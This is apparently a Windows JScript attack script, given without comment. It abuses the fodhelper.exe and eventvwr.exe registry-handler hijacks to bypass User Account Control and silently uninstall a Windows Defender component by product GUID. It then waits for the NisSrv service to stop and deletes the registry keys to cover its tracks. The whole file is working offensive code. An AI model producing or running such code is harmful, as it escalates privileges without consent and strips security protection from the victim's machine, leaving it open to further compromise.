function isServiceRunning(name) {
    var service = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name='" + name + "'");
    var serviceEnumerator = new Enumerator(service);
    var serviceItem = serviceEnumerator.item();
    var state = '';
    try {
        state = serviceItem.State;
    } catch (e) {}
    if (state == 'Running') {
        return true;
    } else {
        return false;
    }
}

var serviceName = 'NisSrv';
var shellApplication = WScript.CreateObject("shell.application");
var wscriptShell = new ActiveXObject("WScript.Shell");
var winmgmts = GetObject("winmgmts:\\\\.\\root\\CIMV2");
var operatingSystem = winmgmts.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL", 0x10 | 0x20);
var operatingSystemEnumerator = new Enumerator(operatingSystem);
var operatingSystemItem = operatingSystemEnumerator.item();
var systemDirectory = operatingSystemItem.SystemDirectory;
var version = operatingSystemItem.Version;
var versionArray = version.split(".");
if (versionArray[0] == '10') {
    wscriptShell.RegWrite(
      "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\",
        'MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet',
        "REG_SZ"
    );
    wscriptShell.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute", "", "REG_SZ");
    shellApplication.ShellExecute("explorer.exe", '"' + systemDirectory + '\\fodhelper.exe"', "", "open", 0);
    WScript.sleep(10000);
    wscriptShell.RegDelete("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\");
} else {
    if (versionArray[0] == '6') {
        wscriptShell.RegWrite(
            "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\",
            'MsiExec.exe /X {2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet',
            "REG_SZ"
        );
        shellApplication.ShellExecute("explorer.exe", '"' + systemDirectory + '\\eventvwr.exe"', "", "open", 0);
        WScript.sleep(10000);
        wscriptShell.RegDelete("HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\");
    }
}

var counter = 0;
while (true) {
    if (isServiceRunning(serviceName)) {
        WScript.sleep(100);
    } else {
        break;
    }
    counter = counter + 1;
    if (counter == 900) {
        break;
    }
}
